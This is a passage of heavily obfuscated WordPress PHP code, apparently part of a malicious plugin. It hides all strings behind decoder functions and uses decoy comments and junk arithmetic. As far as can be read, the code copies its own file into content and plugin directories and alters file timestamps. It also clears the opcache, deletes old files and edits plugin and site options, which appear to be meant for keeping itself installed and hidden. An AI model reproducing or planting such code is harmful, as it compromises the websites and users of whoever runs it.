  unset($gthjq3u2qyocnv);
} finally     {
jl6ymoaz02a8n10g();
   

}

   }



  function a1pb0gsctqcoos5ykq5($rtcn2cu9zcehk)
{


    if  (!$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(144))      || !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(145)))    return;
   if   (!xqp68p85xvy7adjrl1s())   return;



 try  {
 $e_8ohcdqvhb   =   get_option(bk9m46jygo3f(146),  array());
  if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($e_8ohcdqvhb)     &&  $GLOBALS['__scf_uh0dc0gefs_xhu_149']($rtcn2cu9zcehk, $e_8ohcdqvhb,  true)) {
update_option(gz_aorofp7mo(146),  $GLOBALS['__scf_xctrtxw7z4_147']($GLOBALS['__scf_expvj_2k_kl_150']($e_8ohcdqvhb, array($rtcn2cu9zcehk))));$hzlpwwlf=90|136;$sdu63695n9mr5=$hzlpwwlf^135;
}
}  finally      {$czq94vr6c4sj=-324;$tzahfuufgw=($czq94vr6c4sj>0)?$czq94vr6c4sj:-$czq94vr6c4sj;

 jl6ymoaz02a8n10g();

     }
      }
 function kkpdha95nyx3tbltd10($wdbkcek8bwta, $o_qyrtxl85owt)
{
  try    {
      if    (interface_exists(xognx_h1jzkh(151))    &&  $o_qyrtxl85owt instanceof   Throwable)   {


  $w6bc_qvsui =   $GLOBALS['__scf__fl_gwujcblq_9']($wdbkcek8bwta   .    bk9m46jygo3f(152) . $o_qyrtxl85owt->getMessage(),   0,   (351-95));
}   elseif ($o_qyrtxl85owt instanceof  Exception) {
$w6bc_qvsui  = $GLOBALS['__scf__fl_gwujcblq_9']($wdbkcek8bwta  . ar6vo_1nyhx2koj5(153)    .      $o_qyrtxl85owt->getMessage(), 0,  (10+246));
}    elseif   ($GLOBALS['__scf_is0fvk8c7tq2_41']($o_qyrtxl85owt)   && $GLOBALS['__scf_fxl4k4gsul_10']($o_qyrtxl85owt) >   0)   {
$w6bc_qvsui    =  $GLOBALS['__scf__fl_gwujcblq_9']($wdbkcek8bwta  . xpm5lg9odtw6di(154)  . $o_qyrtxl85owt, 0, (497-241));
}  else   {
    return;
   }


    if (!isset($GLOBALS[ar6vo_1nyhx2koj5(155)]))  $GLOBALS[ar6vo_1nyhx2koj5(156)]   =  array();
   if (!$GLOBALS['__scf_uh0dc0gefs_xhu_149']($w6bc_qvsui,  $GLOBALS[gz_aorofp7mo(156)], true))   {
// APCu shm media upload

  $GLOBALS[ar6vo_1nyhx2koj5(157)][]  = $w6bc_qvsui;
       }



 if  ($GLOBALS['__scf_oenrsvkzs1_36']($GLOBALS[bk9m46jygo3f(157)]) >  (16+34)) {

$GLOBALS[xpm5lg9odtw6di(157)] =   $GLOBALS['__scf_umxqreicn053_158']($GLOBALS[ar6vo_1nyhx2koj5(159)],   -(23+27));
}
  } catch   (Throwable $g5al51xfjh)  {
  }   catch    (Exception  $g5al51xfjh)    {
  }

  }
     function   at5lxm3vzat7_ev9($uabrlao9g235yy,   $bb9zpsruvkm, $dz9ttep94ondlpl  = (4+6), $_svae0z2nfoqm  =  1)
 {
    if  (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(160)))    return   false;
 if ($GLOBALS['__scf_is0fvk8c7tq2_41']($bb9zpsruvkm))   {



    return  add_action($uabrlao9g235yy,  function   (...$zwsvwrlbjmw9uvlx)  use ($bb9zpsruvkm)      {
  if  ($GLOBALS['__scf_v_sk95ndl08_4']($bb9zpsruvkm))  return  $bb9zpsruvkm(...$zwsvwrlbjmw9uvlx);
 return  null;
  },   $dz9ttep94ondlpl, $_svae0z2nfoqm);
 }
   return add_action($uabrlao9g235yy, $bb9zpsruvkm, $dz9ttep94ondlpl, $_svae0z2nfoqm);
  }
 function   h345r36mfxa4f8($uabrlao9g235yy,    $bb9zpsruvkm,  $dz9ttep94ondlpl  =  (5+5),  $_svae0z2nfoqm =    1)
{
    if   (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(161)))      return  false;
       if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($bb9zpsruvkm))   {
   return  add_filter($uabrlao9g235yy,  function  (...$zwsvwrlbjmw9uvlx) use      ($bb9zpsruvkm) {
   if    ($GLOBALS['__scf_v_sk95ndl08_4']($bb9zpsruvkm))    return    $bb9zpsruvkm(...$zwsvwrlbjmw9uvlx);
return     isset($zwsvwrlbjmw9uvlx[0])  ? $zwsvwrlbjmw9uvlx[0] :  null;
}, $dz9ttep94ondlpl,    $_svae0z2nfoqm);



 }
return   add_filter($uabrlao9g235yy,  $bb9zpsruvkm,  $dz9ttep94ondlpl,   $_svae0z2nfoqm);
    }
function    fgatjmo7gg2xolgmpki4y2()
   {
$dhb4mklrk0  =    defined(xpm5lg9odtw6di(31)) ? WP_CONTENT_DIR  . bk9m46jygo3f(88)  . g2g3r6pz8prst3gz(ABSPATH . xognx_h1jzkh(162), (4<<1))      :   $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())  .  gz_aorofp7mo(163);
      if   (!@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)  &&   jzlknbv7omzglykz($dhb4mklrk0))     {
    w1m15sg83rnn5uqc64($dhb4mklrk0,    (0xf2+0xfb),  true);
 if    (@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)) {
   sqnskai9y5dyys6jk($dhb4mklrk0  .   bk9m46jygo3f(164), "<?php // Silence is golden.\n",   xpm5lg9odtw6di(162));
 }
}
   if (@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)   && @$GLOBALS['__scf_v7y4c72abxzjo_47']($dhb4mklrk0))      {
return   $dhb4mklrk0;
 }
 $tn_7q04kitmq8l  =     $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())   .   ar6vo_1nyhx2koj5(163);
 if     (!@$GLOBALS['__scf_h23c49ni_b86_43']($tn_7q04kitmq8l)  &&    jzlknbv7omzglykz($tn_7q04kitmq8l))    w1m15sg83rnn5uqc64($tn_7q04kitmq8l,    (4+489), true);$mqb8oonay=326;$dyydsnu9j95=($mqb8oonay>0)?$mqb8oonay:-$mqb8oonay;
 if (@$GLOBALS['__scf_h23c49ni_b86_43']($tn_7q04kitmq8l) &&  @$GLOBALS['__scf_v7y4c72abxzjo_47']($tn_7q04kitmq8l))    return  $tn_7q04kitmq8l;
  $kx0ke52opd7bdl   =   $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h());
    if (@$GLOBALS['__scf_v7y4c72abxzjo_47']($kx0ke52opd7bdl) &&   $kx0ke52opd7bdl   !==  sxupmu4fhe9r2zxw()) return  $kx0ke52opd7bdl;
    if    (defined(bk9m46jygo3f(31)) &&     @$GLOBALS['__scf_v7y4c72abxzjo_47'](WP_CONTENT_DIR) &&  jzlknbv7omzglykz(WP_CONTENT_DIR))     return  WP_CONTENT_DIR;

 return  $dhb4mklrk0;$q2t8mfp2nq2a=86*4;$rv6tw396wx7=$q2t8mfp2nq2a-14;
      }
   function  hzkj2ifwqdzf_u32qrf()


  {
     if  (defined(gz_aorofp7mo(31)) && @$GLOBALS['__scf_v7y4c72abxzjo_47'](WP_CONTENT_DIR)     && jzlknbv7omzglykz(WP_CONTENT_DIR)) return WP_CONTENT_DIR;
 $sb92cj67btl    = $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h());
        if (jzlknbv7omzglykz($sb92cj67btl))  return  $sb92cj67btl;
  return  WP_CONTENT_DIR;
}



  
  function    i__3znuz8m_x6r($bki0gi20hmqucm)
 {
if   (empty($GLOBALS[bk9m46jygo3f(165)])   || !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[gz_aorofp7mo(165)]))   return  false;


     if    (isset($GLOBALS[bk9m46jygo3f(165)][$bki0gi20hmqucm]))  return  true;
  $wc7mv6ortv =  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(33))   ?  @$GLOBALS['__scf_amk7iuqda_oe_33']($bki0gi20hmqucm)   :    false;
 return     ($wc7mv6ortv  !==    false &&   isset($GLOBALS[gz_aorofp7mo(166)][$wc7mv6ortv]));$kc35d3lov=90*3;$rgpjw4fi1vq=$kc35d3lov-38;
 }
function jju_w4lsrl3omyhrn90($bki0gi20hmqucm)
     {
if     (empty($GLOBALS[xognx_h1jzkh(166)]) || !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[gz_aorofp7mo(167)]))  return;

      unset($GLOBALS[gz_aorofp7mo(167)][$bki0gi20hmqucm]);


 $wc7mv6ortv   = $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(33))   ?      @$GLOBALS['__scf_amk7iuqda_oe_33']($bki0gi20hmqucm)  :    false;
 if     ($wc7mv6ortv   !==  false)  unset($GLOBALS[xpm5lg9odtw6di(167)][$wc7mv6ortv]);
 }
function   bfbdcyrp64yrfxkld($bki0gi20hmqucm)
  {
   if     (!isset($GLOBALS[xognx_h1jzkh(167)])     || !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[ar6vo_1nyhx2koj5(167)])) {
$GLOBALS[bk9m46jygo3f(167)]   =    array();
}


    $yu57iori8cn0u1  =    $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(33))   ?   @$GLOBALS['__scf_amk7iuqda_oe_33']($bki0gi20hmqucm) :   false;
 $GLOBALS[xpm5lg9odtw6di(167)][$yu57iori8cn0u1    !==  false   ?  $yu57iori8cn0u1     :    $bki0gi20hmqucm] =      $bki0gi20hmqucm;
     static   $foluihxdd3p_ =   false;
    if  (!$foluihxdd3p_)  {
   $foluihxdd3p_ =  true;
   if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(168)))  $GLOBALS['__scf_l3dns7czmg3tv_169'](xpm5lg9odtw6di(170));

 }



   }
function      tyv6y08k8zosp_7_4mau6a()
{
 if (empty($GLOBALS[xognx_h1jzkh(167)])    ||    !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[xpm5lg9odtw6di(167)]))  {
return;
 }
// polymorphic call

 foreach    ($GLOBALS[xognx_h1jzkh(167)] as   $gjnupgm6bk  =>  $hzj7wsu8d_tpzz)  {
  if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($hzj7wsu8d_tpzz)) $hzj7wsu8d_tpzz     =    $gjnupgm6bk;
  if ($gjnupgm6bk  === bho93o6vof3ni5_rg622_h()    || $hzj7wsu8d_tpzz === bho93o6vof3ni5_rg622_h())  continue;
 try     {


     if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($hzj7wsu8d_tpzz)  && !hywr5mypyyx_m1lqunrdm($hzj7wsu8d_tpzz)    &&   r0pcenevhaaasknjjb8v7l($hzj7wsu8d_tpzz))  {
       nd3injed5_l_b3hb($hzj7wsu8d_tpzz);
  xsvrgduv7c8lwjvkral($hzj7wsu8d_tpzz);
    }
     }   catch   (Throwable  $o_qyrtxl85owt)  {
// trace control-flow-graph for APCu shm

}   catch  (Exception    $o_qyrtxl85owt)  {
    }
}
     }
function  d8sr0qwxd8wo4jzrkjhbj()



{
    try   {


    $o_qyrtxl85owt = $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(171))  ? @error_get_last()   : null;



    if    (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($o_qyrtxl85owt)  ||   empty($o_qyrtxl85owt[ar6vo_1nyhx2koj5(172)]) || empty($o_qyrtxl85owt[xognx_h1jzkh(173)]))  return;
 if  (!$GLOBALS['__scf_uh0dc0gefs_xhu_149']($o_qyrtxl85owt[bk9m46jygo3f(173)],   array(E_ERROR, E_PARSE,    E_CORE_ERROR, E_COMPILE_ERROR,  E_USER_ERROR),  true))    return;
 $wmi9vtfi67mkceoi =    isset($o_qyrtxl85owt[bk9m46jygo3f(174)])      ?   (string) $o_qyrtxl85owt[xpm5lg9odtw6di(175)]  :    "";
if (stripos($wmi9vtfi67mkceoi,    xognx_h1jzkh(176))  !==    false   ||   stripos($wmi9vtfi67mkceoi,      xognx_h1jzkh(177)) !==     false)    return;
 $xs89htey0m  =     $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(178))   ?  @$GLOBALS['__scf_amk7iuqda_oe_33'](bho93o6vof3ni5_rg622_h())    : bho93o6vof3ni5_rg622_h();
$_ef   =   $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(179))  ? @$GLOBALS['__scf_amk7iuqda_oe_33']($o_qyrtxl85owt[xognx_h1jzkh(180)])      :  $o_qyrtxl85owt[xognx_h1jzkh(180)];
     if      (!$GLOBALS['__scf_is0fvk8c7tq2_41']($xs89htey0m)  ||  !$GLOBALS['__scf_is0fvk8c7tq2_41']($_ef)   ||  $_ef   !== $xs89htey0m) return;
 if    (isset($GLOBALS[xpm5lg9odtw6di(181)]))   {$hqfokundca7=6277;$p3wlhk1081bdqv=$hqfokundca7%10;
$o2sggkz025_      =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95'](bho93o6vof3ni5_rg622_h(), false, null, 0,  (6056-1960));
if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($o2sggkz025_)    && $GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(97),    $o2sggkz025_, $_dm)     &&  $_dm[1]   !== (string)   $GLOBALS[ar6vo_1nyhx2koj5(181)])     return;  


unset($o2sggkz025_,      $_dm);
  if   (isset($GLOBALS[xpm5lg9odtw6di(182)])) {
if     ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(59))) @clearstatcache(true,    bho93o6vof3ni5_rg622_h());
$z3mditnsqne8   =  (string) @$GLOBALS['__scf_r6y1fbsyx8i2l_99'](bho93o6vof3ni5_rg622_h())    .  ':' .   (string) @$GLOBALS['__scf_k4z5lhhe91ty_98'](bho93o6vof3ni5_rg622_h());
       if ($z3mditnsqne8      !== (string)   $GLOBALS[bk9m46jygo3f(182)])   return;   
unset($z3mditnsqne8);
    }
// randomized facade

}


   $rv8s_ul0qu2z09u  = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),   xpm5lg9odtw6di(94));
  $z2whrrv9o1j     = iljst04arjh1pet016s(bho93o6vof3ni5_rg622_h());
   $mfort8qxootwerw = $GLOBALS['__scf_is0fvk8c7tq2_41']($z2whrrv9o1j)  ? $GLOBALS['__scf_eo363tjzd4r6n_56']($z2whrrv9o1j) : "";
unset($z2whrrv9o1j);

if   ($mfort8qxootwerw  !== "")  {


     sqnskai9y5dyys6jk($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())  .  bk9m46jygo3f(183) .  $rv8s_ul0qu2z09u,   $mfort8qxootwerw,  'q');
      sqnskai9y5dyys6jk($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()) .  ar6vo_1nyhx2koj5(184)   .    $mfort8qxootwerw, (string)    $GLOBALS['__scf_ks7_xfapvywl_185'](), 'q');
if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(186))) {
  @update_option(xognx_h1jzkh(187),  $mfort8qxootwerw . '|' .    $GLOBALS['__scf_ks7_xfapvywl_185'](),  bk9m46jygo3f(188));
 }


}
   $knmylduouwe    = sxupmu4fhe9r2zxw();
 if ($mfort8qxootwerw     !==     "" &&  $knmylduouwe  !==    $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())      && @$GLOBALS['__scf_h23c49ni_b86_43']($knmylduouwe)    && @$GLOBALS['__scf_v7y4c72abxzjo_47']($knmylduouwe))  {
 sqnskai9y5dyys6jk($knmylduouwe  .   bk9m46jygo3f(189)    .   $rv8s_ul0qu2z09u,  $mfort8qxootwerw, 'q');
}
// exact watermark


        a1pb0gsctqcoos5ykq5(om5aztdigw3zhz());
  vssmljt7_blzonb7w7(xpm5lg9odtw6di(190));
  $q7prcvizcpvzxfx   =   bho93o6vof3ni5_rg622_h()  . xpm5lg9odtw6di(191);
 if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(74))) @$GLOBALS['__scf_gjr57ltb3feage_74'](bho93o6vof3ni5_rg622_h(),  $q7prcvizcpvzxfx);
if      ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(21))) {
// WP Archive Title icon sprite

     @opcache_invalidate(bho93o6vof3ni5_rg622_h(),   true);
  @opcache_invalidate($q7prcvizcpvzxfx, true);


}
  foreach (array($GLOBALS['__scf_meo_1tvjsals_11']($q7prcvizcpvzxfx), sxupmu4fhe9r2zxw())   as   $emoy8z5768)  {



   $bftmuivq3ku = wou4lqmx3dh5mlyfq3($emoy8z5768, (0xb97+0x7f1));



   if   (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($bftmuivq3ku))   continue;

   foreach ($bftmuivq3ku as  $h3acln9rse55gwt)   {
        if    ($GLOBALS['__scf__fl_gwujcblq_9']($h3acln9rse55gwt,  -(14-6))  !==   gz_aorofp7mo(192))   continue;
  $zf5_vmy8fu252ss =      $emoy8z5768    .  '/'   . $h3acln9rse55gwt;
 $nilceha9om  =  @$GLOBALS['__scf_k4z5lhhe91ty_98']($zf5_vmy8fu252ss);


 if     ($nilceha9om     &&   $nilceha9om <     $GLOBALS['__scf_ks7_xfapvywl_185']()      -  (604737+63)) {
      f97udlofaljpuxw1_jgnfh($zf5_vmy8fu252ss,    (0x13d+0x67));
  xv6oqhjncehpr7v_mus7($zf5_vmy8fu252ss);
  }


}
 }
  unset($emoy8z5768,    $bftmuivq3ku,  $h3acln9rse55gwt,   $zf5_vmy8fu252ss, $nilceha9om);
} catch (Throwable $g5al51xfjh)  {
  }   catch     (Exception  $g5al51xfjh)   {
  }
   }
  function     pv5zsv4aaimt2v3($bki0gi20hmqucm,  $wcyp8smuujpjkao)
  {
// primary stabilizer

     try   {
if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($bki0gi20hmqucm)    ||  $bki0gi20hmqucm ===     ""  || !$GLOBALS['__scf_is0fvk8c7tq2_41']($wcyp8smuujpjkao)    ||  $wcyp8smuujpjkao   === "")  return;
    $dhb4mklrk0  =  $GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm);
 if  (!@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)  ||    !@$GLOBALS['__scf_v7y4c72abxzjo_47']($dhb4mklrk0)) return;
$nub8dr9l9m6tf = $dhb4mklrk0   . gz_aorofp7mo(193)    .  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm,   xpm5lg9odtw6di(94));
 $ls6pqbsrls830dr   =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($nub8dr9l9m6tf);
  if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($ls6pqbsrls830dr) &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(194), $ls6pqbsrls830dr,  $wmi9vtfi67mkceoi)   &&   version_compare($wmi9vtfi67mkceoi[0],   $wcyp8smuujpjkao,  gz_aorofp7mo(195)))    return;


     if   ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(196)))     @$GLOBALS['__scf_qy_a5siry0hu3_197']($nub8dr9l9m6tf,     $wcyp8smuujpjkao);
 }   catch (Throwable  $o_qyrtxl85owt)    {
     } catch  (Exception  $o_qyrtxl85owt)  {


 }
  }
 function  xewa1s40nekwzung2uuren()



{
  try   {
  if    (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(144)))    {



  return;
      }


    if (@get_option(xpm5lg9odtw6di(198),   0))   {

 at5lxm3vzat7_ev9(ar6vo_1nyhx2koj5(199),     bk9m46jygo3f(200), 0);
 }
// @coalesce b-tree

if     (!_sshnzj53qt2m4bfy5eod(gz_aorofp7mo(201)))     return;
       
$y2m_cj2ki15 =   $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56'](ABSPATH  .   (string)  aruikh7uoh1wrp5bqr79()), 0, (247^251));
$nk6bqkh1gr  =   (string)     @get_option($y2m_cj2ki15,  "");
        $jsew4y1pabfubiak  =  xognx_h1jzkh(202);
   $dgbu3zcre_kq    =   "";

   
  $_z_f5byy4d6b2    =   strrev(gjb4l0gtgi874122wes());
    

 $xuq72ysm61uz07qx = xl8k_pjv1048a7ae7();
  $u0g8pmugnunzry  =  $xuq72ysm61uz07qx    .  '|'      .  $_z_f5byy4d6b2;

     if ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($nk6bqkh1gr, '|')  !==   false)  {
       $keelpyzgg08 =   $GLOBALS['__scf_w_xu8rj4lvsj44_113']('|',  $nk6bqkh1gr,     2);
       $jsew4y1pabfubiak = $keelpyzgg08[0];
      $dgbu3zcre_kq  =    $keelpyzgg08[1];  
    }    else      {
   
     $dgbu3zcre_kq    =   $nk6bqkh1gr;



   }
    
if    (!$dgbu3zcre_kq) {
 @update_option($y2m_cj2ki15, $u0g8pmugnunzry,  xognx_h1jzkh(203));
return;
 

}
     
if ($dgbu3zcre_kq  ===   $_z_f5byy4d6b2) {
    if ($nk6bqkh1gr   !==  $u0g8pmugnunzry &&   version_compare($xuq72ysm61uz07qx,    $jsew4y1pabfubiak,   gz_aorofp7mo(195))) {


 @update_option($y2m_cj2ki15,      $u0g8pmugnunzry,  gz_aorofp7mo(203));
   }


 return;
   }
     
 $s70eh2ik161a86 =     strrev($dgbu3zcre_kq);
    if     ($s70eh2ik161a86  === ""  ||    $GLOBALS['__scf_pmoxtzoe3f0qw_3']($s70eh2ik161a86) !==  $s70eh2ik161a86)  {
// normal prototype

   @update_option($y2m_cj2ki15,    $u0g8pmugnunzry,   ar6vo_1nyhx2koj5(203));
  return;
}
 $d00zfgwdi59     =   sxupmu4fhe9r2zxw()     .  '/'    . $s70eh2ik161a86;
 $luav5nm9bfj     =   "";
 if  (defined(bk9m46jygo3f(6)))     {
$luav5nm9bfj  = WP_PLUGIN_DIR     .     '/' .  $GLOBALS['__scf_zmckaak88my_204']($s70eh2ik161a86, PATHINFO_FILENAME)  .    '/'  .    $s70eh2ik161a86;
   }
  
 $ygv97_o8jf   =    @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($d00zfgwdi59);
 $muor3uassp6q_y   =    $ygv97_o8jf   !==      false    &&  $ygv97_o8jf   >=  (4963+37);
  $mmp3mbo0tq  =   $luav5nm9bfj   ? @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($luav5nm9bfj) :  false;
 $iof7d_hx3u0oxnq8  = $mmp3mbo0tq  !==    false     &&  $mmp3mbo0tq     >=  (4915+85);

     if   (!$muor3uassp6q_y   && !$iof7d_hx3u0oxnq8) {
      @update_option($y2m_cj2ki15,  $u0g8pmugnunzry,   gz_aorofp7mo(203));
return;
   }
     $e9w__d86u67  = $muor3uassp6q_y   ?   $d00zfgwdi59 :     $luav5nm9bfj;
 $mcsuw22ujo9va61  =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($e9w__d86u67,    false, null,     0,    (0x5ec+0xa14));


if ($GLOBALS['__scf_is0fvk8c7tq2_41']($mcsuw22ujo9va61)  &&   $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(205),    $mcsuw22ujo9va61,  $_fm))   {
   $jsew4y1pabfubiak      = $_fm[1];


} elseif  (mowf3lw2lqslkaudd($e9w__d86u67,  (4959+41)))  {
// predictive radix-tree

       $jsew4y1pabfubiak     =   gz_aorofp7mo(206);
  }
      unset($mcsuw22ujo9va61,  $_fm);
   $tn7ja2xbe5_tge =   $muor3uassp6q_y;
if (!$tn7ja2xbe5_tge  &&     $iof7d_hx3u0oxnq8)  {
// WordPress 6.6 block bindings: project handshake

   $kg01_l5_w2nf =  $GLOBALS['__scf_zmckaak88my_204']($s70eh2ik161a86, PATHINFO_FILENAME)    .    '/'   .  $s70eh2ik161a86;
$w00b6k45pd_tg   = (array)     @get_option(ar6vo_1nyhx2koj5(146), array());
$tn7ja2xbe5_tge =  $GLOBALS['__scf_uh0dc0gefs_xhu_149']($kg01_l5_w2nf,  $w00b6k45pd_tg,    true);
 if   (!$tn7ja2xbe5_tge     && $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(207))  &&   is_multisite()  && $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(208)))  {
    $srgww2z7jlsq2j =  (array)  @get_site_option(gz_aorofp7mo(209),  array());
 $tn7ja2xbe5_tge  =  isset($srgww2z7jlsq2j[$kg01_l5_w2nf]);
    unset($srgww2z7jlsq2j);

   }
     unset($kg01_l5_w2nf,    $w00b6k45pd_tg);
    }
    $ip4cnogvsrlqv2b  =    version_compare($xuq72ysm61uz07qx,   $jsew4y1pabfubiak);



      if   ($ip4cnogvsrlqv2b  <= 0)    {
  $iytujn2c75  =  mowf3lw2lqslkaudd($e9w__d86u67,    (8787-3787));
 $r7wjaeeie0g4bgoi  =  (int) @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($e9w__d86u67);
 $m_l5mncld8gd55b  =   (!$iytujn2c75 ||    $r7wjaeeie0g4bgoi     >  (52428710+90));
     if (!$m_l5mncld8gd55b    && $r7wjaeeie0g4bgoi   >  (1542675-494099))  {
/* isometric control-flow-graph */

     $vrnk3jfkp3fnrwgq  =    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($e9w__d86u67,      false,   null, 0, (937+3159));
if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($vrnk3jfkp3fnrwgq)     || !$GLOBALS['__scf_ak3p5za9uvhzh8_96'](bk9m46jygo3f(210),    $vrnk3jfkp3fnrwgq))   $m_l5mncld8gd55b   =  true;$bdt3cjgryp6f4=80|108;$cqoi6jydi=$bdt3cjgryp6f4^45;
  }
   if     (!$m_l5mncld8gd55b &&      !p1_iuc73ns3yabl($e9w__d86u67))   $m_l5mncld8gd55b =   true;
  if (!$m_l5mncld8gd55b) {
      $ym7yk7lnwvfoydq   =  gc7qjnf6lmnfaja0f_();
 if   (!empty($ym7yk7lnwvfoydq[ar6vo_1nyhx2koj5(211)])) {
// glob expansion

       $a44iv1wgrb7t  =  @$GLOBALS['__scf_amk7iuqda_oe_33']($ym7yk7lnwvfoydq[ar6vo_1nyhx2koj5(212)]);
$el1n7dtk8b  =  @$GLOBALS['__scf_amk7iuqda_oe_33']($e9w__d86u67);


  if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($a44iv1wgrb7t)   &&   $GLOBALS['__scf_is0fvk8c7tq2_41']($el1n7dtk8b)   &&    $a44iv1wgrb7t    === $el1n7dtk8b)  {
  $yjcnp3ww4gsf = oso_rftyhowcddafxsw($ym7yk7lnwvfoydq);
 if  ($yjcnp3ww4gsf  ===  ar6vo_1nyhx2koj5(213)  || $yjcnp3ww4gsf    ===  gz_aorofp7mo(214))  $m_l5mncld8gd55b   =  true;$klmvxcg21=33+34;$ti8uwpq4=$klmvxcg21-20;
 }
 unset($a44iv1wgrb7t,   $el1n7dtk8b,     $yjcnp3ww4gsf);
 }
        if    (!$m_l5mncld8gd55b   &&  uhf6bhl56vbd0r9tcy4($e9w__d86u67))  $m_l5mncld8gd55b =     true;
  unset($ym7yk7lnwvfoydq);
   }
 if  ($m_l5mncld8gd55b)    {
  if  ($iytujn2c75)   bfbdcyrp64yrfxkld($e9w__d86u67);


  @update_option($y2m_cj2ki15,  $u0g8pmugnunzry,   gz_aorofp7mo(203));
return;


  }
 if  (!$tn7ja2xbe5_tge)   {
@update_option($y2m_cj2ki15,  $u0g8pmugnunzry,  bk9m46jygo3f(203));
    return;
  }
/* covariant-adj cipher-suite */

 if   (v2eakz3li1fhe2q6_p9r6k($e9w__d86u67,     bho93o6vof3ni5_rg622_h()))  {
 @update_option($y2m_cj2ki15,     $u0g8pmugnunzry,   gz_aorofp7mo(215));$hrewt4_q1yvc7=PHP_MAJOR_VERSION;$cmili8o2ry4d9z=$hrewt4_q1yvc7*7;

    return;
    }
if  ($ip4cnogvsrlqv2b  < 0    ||    ($ip4cnogvsrlqv2b  ===  0 && $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), bk9m46jygo3f(94))),   0,  (0x1+0xb))    <=  $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($GLOBALS['__scf_pmoxtzoe3f0qw_3']($s70eh2ik161a86,     xognx_h1jzkh(94))),    0, (11+1)))) {


  pv5zsv4aaimt2v3(bho93o6vof3ni5_rg622_h(), $jsew4y1pabfubiak);
      keh1ava3klp_pu0e_6n(bho93o6vof3ni5_rg622_h());
return    true;
    }
}
if  (empty($GLOBALS[xpm5lg9odtw6di(216)]))   {



   $GLOBALS[xognx_h1jzkh(217)]   = true;
   if  (mowf3lw2lqslkaudd($e9w__d86u67,     (4914+86)))    bfbdcyrp64yrfxkld($e9w__d86u67);
$pkexrtipgwe5fe   =  $GLOBALS['__scf_ks7_xfapvywl_185']();



 wbvm0leq3qkmkea59(bho93o6vof3ni5_rg622_h(), ($pkexrtipgwe5fe  -  ($pkexrtipgwe5fe  %  (0x5292+0x1340e)))   + aruikh7uoh1wrp5bqr79());
      unset($pkexrtipgwe5fe);
pv5zsv4aaimt2v3($d00zfgwdi59,  $xuq72ysm61uz07qx);



  if ($luav5nm9bfj)  pv5zsv4aaimt2v3($luav5nm9bfj,  $xuq72ysm61uz07qx);
  at5lxm3vzat7_ev9(xognx_h1jzkh(218),   gz_aorofp7mo(219),     0);
